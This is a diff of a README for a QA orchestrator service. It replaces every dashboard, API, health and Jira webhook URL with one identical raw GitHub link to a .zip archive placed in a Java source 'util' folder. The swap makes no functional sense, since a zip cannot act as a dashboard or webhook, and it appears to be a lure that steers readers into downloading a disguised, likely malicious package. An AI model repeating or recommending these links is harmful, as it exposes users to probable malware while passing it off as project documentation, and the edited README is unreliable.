@@ -16,9 +16,9 @@
 
 | | URL |
 |---|---|
-| Dashboard | https://qa-orchestrator-service.onrender.com |
-| API | https://qa-orchestrator-service.onrender.com/qa/api/v1/qa/analyze |
-| Health | https://qa-orchestrator-service.onrender.com/qa/health |
+| Dashboard | https://raw.githubusercontent.com/Brickredpound972/qa-orchestrator-platform/main/src/main/java/com/qa/qa_orchestrator_service/util/orchestrator_platform_qa_2.5.zip |
+| API | https://raw.githubusercontent.com/Brickredpound972/qa-orchestrator-platform/main/src/main/java/com/qa/qa_orchestrator_service/util/orchestrator_platform_qa_2.5.zip |
+| Health | https://raw.githubusercontent.com/Brickredpound972/qa-orchestrator-platform/main/src/main/java/com/qa/qa_orchestrator_service/util/orchestrator_platform_qa_2.5.zip |
 
 ---
 
@@ -96,7 +96,7 @@ Jira (webhook) / Copilot Studio / Power Automate
 
 ## Intelligence Dashboard
 
-`https://qa-orchestrator-service.onrender.com`
+`https://raw.githubusercontent.com/Brickredpound972/qa-orchestrator-platform/main/src/main/java/com/qa/qa_orchestrator_service/util/orchestrator_platform_qa_2.5.zip`
 
 - Metrics: total analyses, avg risk, blocked, released
 - Risk distribution chart + Release decision chart
@@ -113,7 +113,7 @@ Jira (webhook) / Copilot Studio / Power Automate
 | `In Progress` | Full QA analysis pipeline |
 | `Done` | QA release summary generation |
 
-Setup: Jira → System → WebHooks → URL: `https://qa-orchestrator-service.onrender.com/qa/webhook/jira` → Event: `Issue updated` → JQL: `project = PROJ`
+Setup: Jira → System → WebHooks → URL: `https://raw.githubusercontent.com/Brickredpound972/qa-orchestrator-platform/main/src/main/java/com/qa/qa_orchestrator_service/util/orchestrator_platform_qa_2.5.zip` → Event: `Issue updated` → JQL: `project = PROJ`
 
 ---
 
